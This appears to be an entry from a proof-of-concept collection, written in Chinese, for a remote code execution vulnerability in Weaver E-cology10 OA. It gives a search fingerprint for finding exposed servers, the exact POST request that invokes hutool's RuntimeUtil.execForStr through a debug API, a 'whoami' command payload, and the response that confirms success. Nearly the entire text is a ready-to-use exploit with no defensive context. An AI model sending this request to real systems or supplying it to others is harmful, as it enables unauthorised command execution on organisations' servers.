# 泛微E-cology10method存在远程代码执行漏洞

泛微OA ｜ 命令执行 ｜ —
- **指纹**：`icon_hash="-1619753057"`
- **请求**：`POST /papi/esearch/data/devops/dubboApi/debug/method?interfaceName=cn.hutool.core.util.RuntimeUtil&methodName=execForStr HTTP/1.1`

**Payload**
```
[["whoami"]]
```
- **响应特征**：200